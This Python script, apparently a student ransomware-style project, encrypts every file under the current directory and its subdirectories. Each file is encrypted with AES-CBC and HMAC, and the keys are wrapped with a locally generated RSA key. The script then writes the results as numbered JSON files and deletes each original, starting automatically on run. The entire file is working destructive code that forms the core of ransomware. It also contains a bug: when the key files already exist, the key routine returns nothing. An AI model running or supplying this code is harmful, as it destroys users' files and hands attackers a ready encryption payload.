import os
import os.path
import json
import base64

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes, hmac
from cryptography.hazmat.primitives import padding as textPadder
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization

def RSAKeyGen():  # Method will generate a serialized public and private key and then write them to a PEM file(one for each key)

    constantFilePath = os.getcwd() #Actual code to be used in exe file
    pemFiles = [] #List that will store all the pem files in the directory

    #If public and private pem files exist we add them to our pemFiles list
    for files in os.listdir(constantFilePath):
        if files == "publicKey.pem" or files == "privateKey.pem":
            pemFiles.append(files)

    #If we have a hit on the public or private pem files we open that file
    if len(pemFiles) > 0:
        for i in range(len(pemFiles)):
            pemFile = open(pemFiles[i], "r") #Read the pem file
            headline = pemFile.read() #read the headline
            pemFile.close() #close the file

            if "BEGIN PUBLIC KEY" in headline: #If the headline has the Public key headline
                publicPemFile = constantFilePath + "/"+ pemFiles[i] #add that filepath as our publicPemFile
    #Else if none of those files exist we create a new private and public key and get their filepaths
    else:
        #Generating a private key
        private_key = rsa.generate_private_key(public_exponent=KEY_EXPONENT, key_size=KEY_SIZE,
                                               backend=default_backend())
        #Generating the public key
        public_key = private_key.public_key()

        privKey = private_key.private_bytes(  # We use the RSAPrivateKeyWithSerialization interface to serialize our key
            encoding=serialization.Encoding.PEM,
            # Encoding type in this case is PEM which is base64 format with delimiter
            format=serialization.PrivateFormat.TraditionalOpenSSL,
            # Private key format for our key which includes the header and footer
            encryption_algorithm=serialization.NoEncryption()
            # Encryption algorithm to be used for the serializtion, not used in our case
        )
        # Serializing the public key so that it can be encoded into bits and be transmitted
        pubKey = public_key.public_bytes(
            # We use the RSAPrivateKeyWithSerialization interface to serialize our public key
            encoding=serialization.Encoding.PEM,
            # Encoding type in this case is PEM which is base64 format with delimiter
            format=serialization.PublicFormat.SubjectPublicKeyInfo
            # Using the typical public key format for our public key
        )

        # Generate a publicKey.pem file that will store our serialized public key
        publicFile = open(constantFilePath + '/publicKey.pem', 'wb')  # Create publicKey.pem file
        publicFile.write(pubKey)  # Write our serialized public key to the PEM file
        publicFile.close()  # close the file after writing

        publicPemFile = constantFilePath + "/publicKey.pem" #Filepath to the public key
        privatePemFile = constantFilePath + "/privateKey.pem" #Filepath to the private key

        # Generate a privateKey.pem file that will store our serialized private key
        privateFile = open(constantFilePath + '/privateKey.pem', 'wb')  # Create the privateKey.pem file
        privateFile.write(privKey)  # Write our serialized private key to the PEM file
        privateFile.close()  # Close the file after writing

        return publicPemFile #Return the filepath for the public key

def myFileEncryptHMAC(filepath):

    EncKey = os.urandom(ENC_KEY_SIZE)  # Generate a key that is 32 bytes
    HMACKey = os.urandom(ENC_KEY_SIZE)  # Generate an hmac key that is 32 bytes
    iv = os.urandom(BLOCK_SIZE) #Generate an iv that is 16 bytes

    file = open(filepath, 'rb')  # Open the file
    message = file.read()  # Extract whatever is in file
    file.close()  # close the file

    file_ext = os.path.splitext(filepath)[1]  # Retrieve the file extension of the file

    padder = textPadder.PKCS7(128).padder()  # Creating the padder
    padded_data = padder.update(message)  # updated() method will pad our message which is in bytes
    padded_data += padder.finalize()  # Finalize method that will finish off the padding and return the message in bytes

    cipher = Cipher(algorithms.AES(EncKey), modes.CBC(iv), default_backend())  # Create cipher to include AES and CBC
    encryptor = cipher.encryptor()  # Create the Cipher Context instance that we will used to encrypt our message
    cipher_text = encryptor.update(padded_data) + encryptor.finalize()  # Encrypt the padded message to cipher text

    hmacTag = hmac.HMAC(HMACKey, hashes.SHA256(),default_backend())  # creating the HMAC tag by using hash function algorithm SHA256
    hmacTag.update(cipher_text)  # Update method that will hash and authenticate the bytes of the cipher text message u
    # Finalizing the current creation of the tag for our cipher text making sure it has not been altered

    file = open(filepath, 'wb')  # Opens the file a
    file.write(cipher_text)  # write back the encoded cipher text
    file.close()  # Close the file

    return cipher_text, iv, hmacTag.finalize(), EncKey, HMACKey, file_ext


def myRSAEncrypt(filepath, RSA_publickey_filepath):

    (cipher_text, iv, tag, EncKey, HMACKey, file_ext) = myFileEncryptHMAC(filepath)  # Call the myFileEncryptHMAC method to encrypt

    concatenated_Keys = EncKey + HMACKey  # Concatenate the Encryption key and the HMAC key

    # By default it will
    # If the file DOES EXIST then we will load the public key from the public key.pem file
    with open(RSA_publickey_filepath, "rb") as key_file:
        public_key = serialization.load_pem_public_key(  # We read the public pem file which is storing our key
            key_file.read(),  # we read the pem file that holds our key
            backend=default_backend()
        )

    # Encrypt key which is the encryption key and hmac key concatenated
    # We will use the RSA public key and the OAEP padding mode to encrypt the key
    # The result will be an RSA Cipher
    RSACipher = public_key.encrypt(  # Anyone can encrypt data so we use the public key to encrypt
        concatenated_Keys,  # We will encrypt the concatenated encryption key and our hmac key
        padding.OAEP(# We will also apply padding to our key using the OAEP interface padding scheme which will provide probabilistic encryption
            # We also apply mask generation function MGF1 to our OAEP
            # Our MGF1 padding will also take in the hashing algorithm SHA256
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),  # We will use the hashing algorithm SHA256 with our OAEP padding
            label=None
        )
        # If no instance of an algorithm is passed into the OAEP interface a TypeError will be triggered, same applies to MGF1 padding
        # "Expected instance of hashes.HashAlgorithm"
    )

    return RSACipher, cipher_text, iv, tag, file_ext

def encryptEverything(testDir, publicPemFile):

    counter = 0 #Counter to be used for auto incrementing and renaming

    for root, dirs, filesToEncrypt in os.walk(testDir): #Traverse through the directory
        for files in filesToEncrypt: #Traverse through the files in the directory
            #If the files are not named privateKey or publicKey and are not json files encrypt them
            if "privateKey" not in files and "publicKey" not in files and not files.endswith(".json"):

                filePath = root + "/" + files #the filepath for each file in the directory

                #Call the myRSAEncrypt method to encrypt each file in the directory and subdirectories
                (RSACipher, cipher_text, iv, tag, file_ext) = myRSAEncrypt(filePath, publicPemFile)

                # Encodes the ciphertext, encrypted keys, and HMAC tag into JSON serializable format
                btsCiphertext = base64.encodebytes(cipher_text)
                encodedCiphertext = btsCiphertext.decode('ascii')
                btsEncryptedKeys = base64.encodebytes(RSACipher)
                encodedEncryptedKeys = btsEncryptedKeys.decode('ascii')
                btsHMACTag = base64.encodebytes(tag)
                encodedHMACTag = btsHMACTag.decode('ascii')
                btsIV = base64.encodebytes(iv)
                encodedIV = btsIV.decode('ascii')

                #Store our encoded encrypted data and put them in a JSON file
                jsonObject = {"RSACipher": encodedEncryptedKeys,
                              "Ciphertext": encodedCiphertext,
                              "Tag": encodedHMACTag,
                              "IV": encodedIV,
                              "File Extension": file_ext}
                JSONFile = json.dumps(jsonObject)

                #Naming all the encrypted json files, auto increment and rename
                counter += 1
                jsonPath = os.path.join(root, ("encryptedFile_" + str(counter) + ".json"))

                #Opening the created json files and writing our JSON data to it
                jsonOutput = open(jsonPath, "w")
                jsonOutput.write(JSONFile)

                #Removes the plaintext file from the directory
                os.remove(filePath)





'''
----------------------------MAIN METHOD-------------------------------------------------
'''

BLOCK_SIZE = 16 #used for the IV
ENC_KEY_SIZE = 32 #Our key encryption key size
KEY_EXPONENT = 65537 #Exponent variable used for our private and public key generation
KEY_SIZE = 2048 #The size of our public and private key sizes

testDir = os.getcwd()

publicPemFile = RSAKeyGen() #Check for pem files and generate if none

encryptEverything(testDir, publicPemFile) #ENCRYPT every file in the directory
